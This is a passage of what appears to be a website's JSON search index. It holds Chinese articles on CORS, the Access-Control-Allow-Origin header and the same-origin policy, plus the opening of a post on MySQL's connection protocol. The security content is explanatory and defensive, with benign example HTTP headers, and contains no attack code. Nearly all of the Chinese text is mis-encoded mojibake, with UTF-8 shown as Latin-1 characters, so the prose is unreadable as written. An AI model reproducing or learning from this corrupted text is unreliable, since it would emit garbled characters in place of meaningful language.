","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:5:2","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"ç™½åå•ä¸­é¿å… null é¿å… Access-Control-Allow-Origin: null ã€‚æ¥è‡ªå†…éƒ¨æ–‡æ¡£å’Œæ²™ç›’è¯·æ±‚çš„è·¨åŸŸèµ„æºè°ƒç”¨å¯ä»¥æŒ‡å®š origin ä¸º null çš„ã€‚CORS å¤´åº”è¯¥æ ¹æ®ç§æœ‰å’Œå…¬å…±æœåŠ¡å™¨çš„å¯ä¿¡æ¥æºæ­£ç¡®å®šä¹‰ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:5:3","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"é¿å…åœ¨å†…éƒ¨ç½‘ç»œä¸­ä½¿ç”¨é€šé…ç¬¦ é¿å…åœ¨å†…éƒ¨ç½‘ç»œä¸­ä½¿ç”¨é€šé…ç¬¦ã€‚å½“å†…éƒ¨æµè§ˆå™¨å¯ä»¥è®¿é—®ä¸å—ä¿¡ä»»çš„å¤–éƒ¨åŸŸæ—¶ï¼Œä»…ä»…ä¾é ç½‘ç»œé…ç½®æ¥ä¿æŠ¤å†…éƒ¨èµ„æºæ˜¯ä¸å¤Ÿçš„ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:5:4","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"CORS ä¸æ˜¯æœåŠ¡ç«¯å®‰å…¨ç­–ç•¥çš„æ›¿ä»£å“ CORS å®šä¹‰çš„åªæ˜¯æµè§ˆå™¨è¡Œä¸ºï¼Œæ°¸è¿œä¸èƒ½æ›¿ä»£æœåŠ¡ç«¯å¯¹æ•æ„Ÿæ•°æ®çš„ä¿æŠ¤ï¼Œæ¯•ç«Ÿæ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨å…¶å®ƒç¯å¢ƒä¸­ä¼ªé€ æ¥è‡ªä»»ä½• origin çš„è¯·æ±‚ã€‚å› æ­¤ï¼Œé™¤äº†æ­£ç¡®é…ç½®çš„ CORS ä¹‹å¤–ï¼Œweb æœåŠ¡ç«¯ä»ç„¶éœ€è¦ä½¿ç”¨è¯¸å¦‚èº«ä»½éªŒè¯å’Œä¼šè¯ç®¡ç†ç­‰æªæ–½å¯¹æ•æ„Ÿæ•°æ®è¿›è¡Œä¿æŠ¤ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/cors/:5:5","tags":[],"title":"web å®‰å…¨ä¹‹ CORS","uri":"/translation/web-security/cors/cors/"},{"categories":["web security"],"content":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šæœ‰å…³ CORS çš„ Access-Control-Allow-Origin å“åº”å¤´ï¼Œä»¥åŠåè€…å¦‚ä½•æ„æˆ CORS å®ç°çš„ä¸€éƒ¨åˆ†ã€‚ CORS é€šè¿‡ä½¿ç”¨ä¸€ç»„ HTTP å¤´éƒ¨æä¾›äº†åŒæºç­–ç•¥çš„å¯æ§åˆ¶æ”¾å®½ï¼Œæµè§ˆå™¨å…è®¸è®¿é—®åŸºäºè¿™äº›å¤´éƒ¨çš„è·¨åŸŸè¯·æ±‚çš„å“åº”ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:0:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ Access-Control-Allow-Origin å“åº”å¤´ï¼Ÿ Access-Control-Allow-Origin å“åº”å¤´æ ‡è¯†äº†è·¨åŸŸè¯·æ±‚å…è®¸çš„è¯·æ±‚æ¥æºï¼Œæµè§ˆå™¨ä¼šå°† Access-Control-Allow-Origin ä¸è¯·æ±‚ç½‘ç«™ origin è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…åŒ¹é…åˆ™å…è®¸è®¿é—®å“åº”ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:1:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"å®ç°ç®€å•çš„ CORS CORS è§„èŒƒè§„å®šäº† web æœåŠ¡å™¨å’Œæµè§ˆå™¨ä¹‹é—´äº¤æ¢çš„å¤´å†…å®¹ï¼Œå…¶ä¸­ Access-Control-Allow-Origin æ˜¯æœ€é‡è¦çš„ã€‚å½“ç½‘ç«™å‘èµ·è·¨åŸŸèµ„æºè¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨æ·»åŠ  Origin å¤´ï¼ŒéšåæœåŠ¡å™¨è¿”å› Access-Control-Allow-Origin å“åº”å¤´ã€‚ ä¾‹å¦‚ï¼Œorigin ä¸º normal-website.com çš„ç½‘ç«™å‘èµ·äº†å¦‚ä¸‹è·¨åŸŸè¯·æ±‚ï¼š GET /data HTTP/1.1 Host: robust-website.com Origin : https://normal-website.com æœåŠ¡å™¨å“åº”ï¼š HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://normal-website.com æµè§ˆå™¨å°†ä¼šå…è®¸ normal-website.com ç½‘ç«™ä»£ç è®¿é—®å“åº”ï¼Œå› ä¸º Access-Control-Allow-Origin ä¸ Origin åŒ¹é…ã€‚ Access-Control-Allow-Origin å…è®¸å¤šä¸ªåŸŸï¼Œæˆ–è€… null ï¼Œæˆ–è€…é€šé…ç¬¦ * ã€‚ä½†æ˜¯æ²¡æœ‰æµè§ˆå™¨æ”¯æŒå¤šä¸ª origin ï¼Œä¸”é€šé…ç¬¦çš„ä½¿ç”¨æœ‰é™åˆ¶ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:2:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"å¸¦å‡­è¯çš„è·¨åŸŸèµ„æºè¯·æ±‚ è·¨åŸŸèµ„æºè¯·æ±‚çš„é»˜è®¤è¡Œä¸ºæ˜¯ä¼ é€’è¯·æ±‚æ—¶ä¸ä¼šæºå¸¦å¦‚ cookies å’Œ Authorization å¤´ç­‰å‡­è¯çš„ã€‚ç„¶è€Œï¼Œå¯¹äºå¸¦å‡­è¯çš„è·¨åŸŸè¯·æ±‚ï¼ŒæœåŠ¡å™¨é€šè¿‡è®¾ç½® Access-Control-Allow-Credentials: true å“åº”å¤´å¯ä»¥å…è®¸æµè§ˆå™¨è¯»å–å“åº”ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªç½‘ç«™ä½¿ç”¨ JavaScript å»æ§åˆ¶å‘èµ·è¯·æ±‚æ—¶ä¸€èµ·å‘é€ cookies ï¼š GET /data HTTP/1.1 Host: robust-website.com ... Origin: https://normal-website.com Cookie: JSESSIONID=\u003cvalue\u003e å¾—åˆ°çš„å“åº”ä¸ºï¼š HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://normal-website.com Access-Control-Allow-Credentials: true é‚£ä¹ˆæµè§ˆå™¨å°†ä¼šå…è®¸å‘èµ·è¯·æ±‚çš„ç½‘ç«™è¯»å–å“åº”ï¼Œå› ä¸º Access-Control-Allow-Credentials è®¾ç½®ä¸ºäº† trueã€‚å¦åˆ™ï¼Œæµè§ˆå™¨å°†ä¸å…è®¸è®¿é—®å“åº”ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:3:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"ä½¿ç”¨é€šé…ç¬¦æ”¾å®½ CORS Access-Control-Allow-Origin å¤´æ”¯æŒä½¿ç”¨é€šé…ç¬¦ * ï¼Œå¦‚ Access-Control-Allow-Origin: * æ³¨æ„ï¼šé€šé…ç¬¦ä¸èƒ½ä¸å…¶ä»–å€¼ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚ä¸‹æ–¹å¼æ˜¯éæ³•çš„ï¼š Access-Control-Allow-Origin: https://*.normal-website.com å¹¸è¿çš„æ˜¯ï¼ŒåŸºäºå®‰å…¨è€ƒè™‘ï¼Œé€šé…ç¬¦çš„ä½¿ç”¨æ˜¯æœ‰é™åˆ¶çš„ï¼Œä½ ä¸èƒ½åŒæ—¶ä½¿ç”¨é€šé…ç¬¦ä¸å¸¦å‡­è¯çš„è·¨åŸŸä¼ è¾“ã€‚å› æ­¤ï¼Œä»¥ä¸‹å½¢å¼çš„æœåŠ¡å™¨å“åº”æ˜¯ä¸å…è®¸çš„ï¼š Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true å› ä¸ºè¿™æ˜¯éå¸¸å±é™©çš„ï¼Œè¿™ç­‰äºå‘æ‰€æœ‰äººå…¬å¼€ç›®æ ‡ç½‘ç«™ä¸Šæ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„å†…å®¹ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:4:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"é¢„æ£€ ä¸ºäº†ä¿æŠ¤é—ç•™èµ„æºä¸å— CORS å…è®¸çš„æ‰©å±•è¯·æ±‚çš„å½±å“ï¼Œé¢„æ£€ä¹Ÿæ˜¯ CORS è§„èŒƒä¸­çš„ä¸€éƒ¨åˆ†ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“è·¨åŸŸè¯·æ±‚åŒ…æ‹¬éæ ‡å‡†çš„ HTTP method æˆ– header æ—¶ï¼Œåœ¨è¿›è¡Œè·¨åŸŸè¯·æ±‚ä¹‹å‰ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘èµ·ä¸€æ¬¡ method ä¸º OPTIONS çš„è¯·æ±‚ï¼Œå¹¶ä¸”å¯¹æœåŠ¡ç«¯å“åº”çš„ Access-Control-* ä¹‹ç±»çš„å¤´è¿›è¡Œåˆæ­¥æ£€æŸ¥ï¼Œå¯¹æ¯” originã€method å’Œ header ç­‰ç­‰ï¼Œè¿™å°±å«é¢„æ£€ã€‚ ä¾‹å¦‚ï¼Œå¯¹ä½¿ç”¨ PUT æ–¹æ³•å’Œ Special-Request-Header è‡ªå®šä¹‰è¯·æ±‚å¤´çš„é¢„æ£€è¯·æ±‚ä¸ºï¼š OPTIONS /data HTTP/1.1 Host: \u003csome website\u003e ... Origin: https://normal-website.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: Special-Request-Header æœåŠ¡å™¨å¯èƒ½å“åº”ï¼š HTTP/1.1 204 No Content ... Access-Control-Allow-Origin: https://normal-website.com Access-Control-Allow-Methods: PUT, POST, OPTIONS Access-Control-Allow-Headers: Special-Request-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 240 è¿™ä¸ªå“åº”çš„å«ä¹‰: Access-Control-Allow-Origin å…è®¸çš„è¯·æ±‚åŸŸã€‚ Access-Control-Allow-Methods å…è®¸çš„è¯·æ±‚æ–¹æ³•ã€‚ Access-Control-Allow-Headers å…è®¸çš„è¯·æ±‚å¤´ã€‚ Access-Control-Allow-Credentials å…è®¸å¸¦å‡­è¯çš„è¯·æ±‚ã€‚ Access-Control-Max-Age è®¾ç½®é¢„æ£€å“åº”çš„æœ€å¤§ç¼“å­˜æ—¶é—´ï¼Œé€šè¿‡ç¼“å­˜å‡å°‘é¢„æ£€è¯·æ±‚å¢åŠ çš„é¢å¤–çš„ HTTP è¯·æ±‚å¾€è¿”çš„å¼€é”€ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:5:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"CORS èƒ½é˜²æ­¢ CSRF å—ï¼Ÿ CORS æ— æ³•æä¾›å¯¹è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»çš„é˜²æŠ¤ï¼Œè¿™æ˜¯ä¸€ä¸ªå®¹æ˜“å‡ºç°è¯¯è§£çš„åœ°æ–¹ã€‚ CORS æ˜¯å¯¹åŒæºç­–ç•¥çš„å—æ§æ”¾å®½ï¼Œå› æ­¤é…ç½®ä¸å½“çš„ CORS å®é™…ä¸Šå¯èƒ½ä¼šå¢åŠ  CSRF æ”»å‡»çš„å¯èƒ½æ€§æˆ–åŠ å‰§å…¶å½±å“ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/access-control-allow-origin/:6:0","tags":[],"title":"CORS å’Œ Access-Control-Allow-Origin å“åº”å¤´","uri":"/translation/web-security/cors/access-control-allow-origin/"},{"categories":["web security"],"content":"Same-origin policy (SOP)","date":"2021-02-28","objectID":"/translation/web-security/cors/same-origin-policy/","tags":[],"title":"Same-origin policy (SOP)","uri":"/translation/web-security/cors/same-origin-policy/"},{"categories":["web security"],"content":"Same-origin policy (SOP) - åŒæºç­–ç•¥ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ä»¥åŠå®ƒæ˜¯å¦‚ä½•å®ç°çš„ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/same-origin-policy/:0:0","tags":[],"title":"Same-origin policy (SOP)","uri":"/translation/web-security/cors/same-origin-policy/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ï¼Ÿ åŒæºç­–ç•¥æ˜¯ä¸€ç§æ—¨åœ¨é˜²æ­¢ç½‘ç«™äº’ç›¸æ”»å‡»çš„ web æµè§ˆå™¨çš„å®‰å…¨æœºåˆ¶ã€‚ åŒæºç­–ç•¥é™åˆ¶ä¸€ä¸ªæºä¸Šçš„è„šæœ¬è®¿é—®å¦ä¸€ä¸ªæºçš„æ•°æ®ã€‚ Origin æºç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šschemaã€domainã€port ï¼Œæ‰€è°“çš„åŒæºå°±æ˜¯è¦æ±‚è¿™ä¸‰ä¸ªéƒ¨åˆ†å…¨éƒ¨ç›¸åŒã€‚ ä¾‹å¦‚ä¸‹é¢è¿™ä¸ª URLï¼š http://normal-website.com/example/example.html å…¶ schema æ˜¯ httpï¼Œdomain æ˜¯ normal-website.comï¼Œport æ˜¯ 80 ã€‚ä¸‹è¡¨æ˜¾ç¤ºäº†å¦‚æœä¸Šè¿° URL ä¸­çš„å†…å®¹å°è¯•è®¿é—®å…¶å®ƒæºå°†ä¼šæ˜¯ä»€ä¹ˆæƒ…å†µï¼š è®¿é—®çš„ URL æ˜¯å¦å¯ä»¥è®¿é—® http://normal-website.com/example/ æ˜¯ï¼ŒåŒæº http://normal-website.com/example2/ æ˜¯ï¼ŒåŒæº https://normal-website.com/example/ å¦: scheme å’Œ port éƒ½ä¸åŒ http://en.normal-website.com/example/ å¦: domain ä¸åŒ http://www.normal-website.com/example/ å¦: domain ä¸åŒ http://normal-website.com:8080/example/ å¦: port ä¸åŒ* *IE æµè§ˆå™¨å°†ä¼šå…è®¸è®¿é—®ï¼Œå› ä¸º IE æµè§ˆå™¨åœ¨åº”ç”¨åŒæºç­–ç•¥æ—¶ä¸è€ƒè™‘ç«¯å£å·ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/same-origin-policy/:1:0","tags":[],"title":"Same-origin policy (SOP)","uri":"/translation/web-security/cors/same-origin-policy/"},{"categories":["web security"],"content":"ä¸ºä»€ä¹ˆåŒæºç­–ç•¥æ˜¯å¿…è¦çš„ï¼Ÿ å½“æµè§ˆå™¨ä»ä¸€ä¸ªæºå‘é€ HTTP è¯·æ±‚åˆ°å¦ä¸€ä¸ªæºæ—¶ï¼Œä¸å¦ä¸€ä¸ªæºç›¸å…³çš„ä»»ä½• cookie ï¼ˆåŒ…æ‹¬èº«ä»½éªŒè¯ä¼šè¯cookieï¼‰ä¹Ÿå°†ä¼šä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†ä¸€èµ·å‘é€ã€‚è¿™æ„å‘³ç€å“åº”å°†åœ¨ç”¨æˆ·ä¼šè¯ä¸­è¿”å›ï¼Œå¹¶åŒ…å«æ­¤ç‰¹å®šç”¨æˆ·çš„ç›¸å…³æ•°æ®ã€‚å¦‚æœæ²¡æœ‰åŒæºç­–ç•¥ï¼Œå¦‚æœä½ è®¿é—®äº†ä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼Œå®ƒå°†èƒ½å¤Ÿè¯»å–ä½  GMail ä¸­çš„ç”µå­é‚®ä»¶ã€Facebook ä¸Šçš„ç§äººæ¶ˆæ¯ç­‰ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/same-origin-policy/:2:0","tags":[],"title":"Same-origin policy (SOP)","uri":"/translation/web-security/cors/same-origin-policy/"},{"categories":["web security"],"content":"åŒæºç­–ç•¥æ˜¯å¦‚ä½•å®æ–½çš„ï¼Ÿ åŒæºç­–ç•¥é€šå¸¸æ§åˆ¶ JavaScript ä»£ç å¯¹è·¨åŸŸåŠ è½½çš„å†…å®¹çš„è®¿é—®ã€‚é€šå¸¸å…è®¸é¡µé¢èµ„æºçš„è·¨åŸŸåŠ è½½ã€‚ä¾‹å¦‚ï¼ŒåŒæºç­–ç•¥å…è®¸é€šè¿‡ \u003cimg\u003e æ ‡ç­¾åµŒå…¥å›¾åƒï¼Œé€šè¿‡ \u003cvideo\u003e æ ‡ç­¾åµŒå…¥åª’ä½“ã€ä»¥åŠé€šè¿‡ \u003cscript\u003e æ ‡ç­¾åµŒå…¥ JavaScript ã€‚ä½†æ˜¯ï¼Œé¡µé¢åªèƒ½åŠ è½½è¿™äº›å¤–éƒ¨èµ„æºï¼Œé¡µé¢ä¸Šçš„ä»»ä½• JavaScript éƒ½æ— æ³•è¯»å–è¿™äº›èµ„æºçš„å†…å®¹ã€‚ åŒæºç­–ç•¥ä¹Ÿæœ‰ä¸€äº›ä¾‹å¤–ï¼š æœ‰äº›å¯¹è±¡è·¨åŸŸå¯å†™å…¥ä½†ä¸å¯è¯»ï¼Œä¾‹å¦‚ location å¯¹è±¡ï¼Œæˆ–è€…æ¥è‡ª iframes æˆ–æ–°çª—å£çš„ location.href å±æ€§ã€‚ æœ‰äº›å¯¹è±¡è·¨åŸŸå¯è¯»ä½†ä¸å¯å†™ï¼Œä¾‹å¦‚ window å¯¹è±¡çš„ length å±æ€§å’Œ closed å±æ€§ã€‚ åœ¨ location å¯¹è±¡ä¸Šå¯ä»¥è·¨åŸŸè°ƒç”¨ replace å‡½æ•°ã€‚ ä½ å¯ä»¥è·¨åŸŸè°ƒç”¨æŸäº›å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥åœ¨ä¸€ä¸ªæ–°çª—å£ä¸Šè°ƒç”¨ closeã€blurã€focus å‡½æ•°ã€‚ä¹Ÿå¯ä»¥åœ¨ iframes å’Œæ–°çª—å£ä¸Š postMessage å‡½æ•°ä»¥å°†æ¶ˆæ¯ä»ä¸€ä¸ªåŸŸå‘é€åˆ°å¦ä¸€ä¸ªåŸŸã€‚ ç”±äºå†å²é—ç•™ï¼Œåœ¨å¤„ç† cookie æ—¶ï¼ŒåŒæºç­–ç•¥æ›´ä¸ºå®½æ¾ï¼Œé€šå¸¸å¯ä»¥ä»ç«™ç‚¹çš„æ‰€æœ‰å­åŸŸè®¿é—®å®ƒä»¬ï¼Œå³ä½¿æ¯ä¸ªå­åŸŸå¹¶ä¸æ»¡è¶³åŒæºçš„è¦æ±‚ã€‚ä½ å¯ä»¥ä½¿ç”¨ HttpOnly ä¸€å®šç¨‹åº¦ç¼“è§£è¿™ä¸ªé£é™©ã€‚ ä½¿ç”¨ document.domain å¯ä»¥æ”¾å®½åŒæºç­–ç•¥ï¼Œè¿™ä¸ªç‰¹æ®Šå±æ€§å…è®¸æ”¾å®½ç‰¹å®šåŸŸçš„åŒæºç­–ç•¥ï¼Œä½†å‰ææ˜¯å®ƒæ˜¯ FQDNï¼ˆfully qualified domain nameï¼‰çš„ä¸€éƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼Œä½ æœ‰ä¸€ä¸ªåŸŸå marketing.example.comï¼Œå¹¶ä¸”ä½ æƒ³è¯»å– example.com åŸŸçš„å†…å®¹ã€‚ä¸ºæ­¤ï¼Œä¸¤ä¸ªåŸŸéƒ½éœ€è¦è®¾ç½® document.domain ä¸º example.comï¼Œé‚£ä¹ˆåŒæºç­–ç•¥å°†ä¼šå…è®¸è¿™é‡Œä¸¤ä¸ªåŸŸä¹‹é—´çš„è®¿é—®ï¼Œå°½ç®¡å®ƒä»¬å¹¶ä¸åŒæºã€‚åœ¨è¿‡å»ï¼Œä½ å¯ä»¥å°† document.domain è®¾ç½®ä¸ºé¡¶çº§åŸŸåå¦‚ comï¼Œä»¥å…è®¸åŒä¸€ä¸ªé¡¶çº§åŸŸåä¸Šçš„ä»»ä½•åŸŸä¹‹é—´çš„è®¿é—®ï¼Œä½†æ˜¯ç°ä»£æµè§ˆå™¨å·²ç»ä¸å…è®¸è¿™ä¹ˆåšäº†ã€‚ ","date":"2021-02-28","objectID":"/translation/web-security/cors/same-origin-policy/:3:0","tags":[],"title":"Same-origin policy (SOP)","uri":"/translation/web-security/cors/same-origin-policy/"},{"categories":["MySQL"],"content":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication MySQL å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡åŸºäºç‰¹å®šçš„ TCP åè®®ï¼Œæœ¬æ–‡å°†ä¼šè¯¦è§£å…¶ä¸­çš„ Connection å’Œ Replication éƒ¨åˆ†ï¼Œè¿™ä¸¤ä¸ªéƒ¨åˆ†åˆ†åˆ«å¯¹åº”çš„æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€å®Œæˆè®¤è¯é‰´æƒï¼Œä»¥åŠå®¢æˆ·ç«¯æ³¨å†Œæˆä¸ºä¸€ä¸ª slave å¹¶è·å– master çš„ binlog æ—¥å¿—ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:0:0","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"Connetcion Phase MySQL å®¢æˆ·ç«¯æƒ³è¦ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯éœ€è¦æˆåŠŸå»ºç«‹è¿æ¥ï¼Œæ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š client å‘èµ·ä¸€ä¸ª TCP è¿æ¥ã€‚ server å“åº”ä¸€ä¸ª Initial Handshake Packetï¼ˆåˆå§‹åŒ–æ¡æ‰‹åŒ…ï¼‰ï¼Œå†…å®¹ä¼šåŒ…å«ä¸€ä¸ªé»˜è®¤çš„è®¤è¯æ–¹å¼ã€‚ è¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ï¼ŒåŒæ–¹å»ºç«‹ SSL åŠ å¯†è¿æ¥ã€‚ client å›åº” Handshake Response Packetï¼Œå†…å®¹éœ€è¦åŒ…æ‹¬ç”¨æˆ·åå’ŒæŒ‰ç…§æŒ‡å®šæ–¹å¼è¿›è¡ŒåŠ å¯†åçš„å¯†ç æ•°æ®ã€‚ server å“åº” OK_Packet ç¡®è®¤è®¤è¯æˆåŠŸï¼Œæˆ–è€… ERR_Packet è¡¨ç¤ºè®¤è¯å¤±è´¥å¹¶å…³é—­è¿æ¥ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:1:0","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"Packet ä¸€ä¸ª Packet å…¶å®å°±æ˜¯ä¸€ä¸ª TCP åŒ…ï¼Œæ‰€æœ‰åŒ…éƒ½æœ‰ä¸€ä¸ªæœ€åŸºæœ¬çš„ç»“æ„ï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ‰€æœ‰åŒ…éƒ½å¯ä»¥çœ‹ä½œç”± header å’Œ body ä¸¤éƒ¨åˆ†æ„æˆï¼šç¬¬ä¸€éƒ¨åˆ† header æ€»å…±æœ‰ 4 ä¸ªå­—èŠ‚ï¼Œ3 ä¸ªå­—èŠ‚ç”¨æ¥æ ‡è¯† body å³ payload çš„å¤§å°ï¼Œ1 ä¸ªå­—èŠ‚è®°å½• sequence IDï¼›ç¬¬äºŒéƒ¨åˆ† body å°±æ˜¯ payload å®é™…çš„è´Ÿè½½æ•°æ®ã€‚ ç”±äº payload length åªæœ‰ 3 ä¸ªå­—èŠ‚æ¥è®°å½•ï¼Œæ‰€ä»¥ä¸€ä¸ª packet çš„ payload çš„å¤§å°ä¸èƒ½è¶…è¿‡ 2^24 = 16 MB ï¼Œç¤ºä¾‹ï¼š Packet : å½“æ•°æ®ä¸è¶…è¿‡ 16 MB æ—¶ï¼Œå‡†ç¡®æ¥è¯´æ˜¯ payload çš„å¤§å°ä¸è¶…è¿‡ 2^24-1 Byteï¼ˆä¸‰ä¸ªå­—èŠ‚æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§æ•´æ•° 0xFFFFFFï¼‰ï¼Œå‘é€ä¸€ä¸ª packet å°±å¤Ÿäº†ã€‚ å½“æ•°æ®å¤§å°è¶…è¿‡äº† 16 MB æ—¶ï¼Œå°±éœ€è¦æŠŠæ•°æ®åˆ‡åˆ†æˆå¤šä¸ª packet ä¼ è¾“ã€‚ å½“æ•°æ® payload çš„åˆšå¥½æ˜¯ 2^24-1 Byte æ—¶ï¼Œä¸€ä¸ªåŒ…è™½ç„¶è¶³å¤Ÿäº†ï¼Œä½†æ˜¯ä¸ºäº†è¡¨ç¤ºæ•°æ®ä¼ è¾“å®Œæ¯•ï¼Œä»ç„¶ä¼šå¤šä¼ ä¸€ä¸ª payload ä¸ºç©ºçš„ packet ã€‚ Sequence IDï¼šåŒ…çš„åºåˆ—å·ï¼Œä» 0 å¼€å§‹é€’å¢ã€‚åœ¨ä¸€ä¸ªå®Œæ•´çš„ä¼šè¯è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªåŒ…çš„åºåˆ—å·ä¾æ¬¡åŠ ä¸€ï¼Œå½“å¼€å§‹ä¸€ä¸ªæ–°çš„ä¼šè¯æ—¶ï¼Œåºåˆ—å·é‡æ–°ä» 0 å¼€å§‹ã€‚ä¾‹å¦‚ï¼šåœ¨å»ºç«‹è¿æ¥çš„é˜¶æ®µï¼Œserver å‘é€ Initial Handshake Packetï¼ˆ Sequence ID ä¸º 0 ï¼‰ï¼Œclient å›åº” Handshake Response Packetï¼ˆ Sequence ID ä¸º 1 ï¼‰ï¼Œserver å†å“åº” OK_Packet æˆ–è€… ERR_Packetï¼ˆ Sequence ID ä¸º 2 ï¼‰ï¼Œç„¶åå»ºç«‹è¿æ¥çš„é˜¶æ®µå°±ç»“æŸäº†ï¼Œå†æœ‰åç»­çš„å‘½ä»¤æ•°æ®ï¼ŒåŒ…çš„ Sequence ID å°±é‡æ–°ä» 0 å¼€å§‹ï¼›åœ¨å‘½ä»¤é˜¶æ®µï¼ˆclient å‘ server å‘é€å¢åˆ æ”¹æŸ¥è¿™äº›éƒ½å±äºå‘½ä»¤é˜¶æ®µï¼‰ï¼Œä¸€ä¸ªå‘½ä»¤çš„è¯·æ±‚å’Œå“åº”å°±å¯ä»¥çœ‹ä½œä¸€ä¸ªå®Œæ•´çš„ä¼šè¯è¿‡ç¨‹ï¼Œæ¯”å¦‚ client å…ˆå‘ server å‘é€äº†ä¸€ä¸ªæŸ¥è¯¢è¯·æ±‚ï¼Œç„¶å server å¯¹è¿™ä¸ªæŸ¥è¯¢è¯·æ±‚è¿›è¡Œäº†å“åº”ï¼Œé‚£ä¹ˆè¿™ä¸€æ¬¡ä¼šè¯å°±ç»“æŸäº†ï¼Œä¸‹ä¸€ä¸ªå‘½ä»¤å°±æ˜¯æ–°çš„ä¼šè¯ï¼ŒSequence ID ä¹Ÿå°±é‡æ–°ä» 0 å¼€å§‹é€’å¢ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:1:1","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"Initial Handshake Packet å»ºç«‹è¿æ¥æ—¶ï¼Œå½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ª TCP è¿æ¥åï¼ŒMySQL æœåŠ¡ç«¯å°±ä¼šå›åº”ä¸€ä¸ª Initial Handshake Packet 